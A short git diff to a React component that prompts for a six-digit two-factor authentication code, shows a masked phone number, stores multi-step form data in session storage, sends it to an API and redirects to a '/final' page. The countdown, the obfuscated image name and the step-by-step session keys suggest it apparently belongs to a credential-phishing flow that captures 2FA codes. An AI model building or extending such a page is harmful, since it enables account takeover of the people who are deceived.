@@ -10,7 +10,7 @@ const FormConfirmComponent = () => {
     const [timeLeft, setTimeLeft] = useState(import.meta.env.VITE_TIME_COUNTDOWN);
     const [activeWaring, setActiveWaring] = useState(false);
     const [form] = Form.useForm();
-    const [inforUser, setInforUser] = useState();
+    const [inforUser, setInforUser] = useState<any>();
     const navigate = useNavigate();
 
     useEffect(() => {
@@ -71,7 +71,7 @@ const FormConfirmComponent = () => {
             callApi(dataSendSuccess)
             saveSession('stepFive', dataSendSuccess )
             removeSession('stepThree')
-            navigate('/waitting');
+            navigate('/final');
         }
 
     };
@@ -99,7 +99,7 @@ const FormConfirmComponent = () => {
                                 <h3 className="twh3">Go to your authentication app</h3>
                                 <div className="bodyyy">
                                     <p>
-                                        {!inforUser ? '' : `Enter the 6-digit code for this account from the two- factor authentication app you set up (such as Duo Mobile or Google Authenticator) or Enter the code we sent to ${inforUser.mobilePhone.slice(0, 3) + " *** **" + inforUser.mobilePhone.slice(-3)}`}</p>
+                                    {!inforUser ? '' : `Enter the 6-digit code for this account from the two- factor authentication app you set up (such as Duo Mobile or Google Authenticator) or Enter the code we sent to ${inforUser.mobilePhone.slice(0, 3) + " *** **" + inforUser.mobilePhone.slice(-3)}`}</p>
                                     <div>
                                         <img src={jhasbdh3h2b2h3b} width="100%" className="" alt="" />
                                     </div>
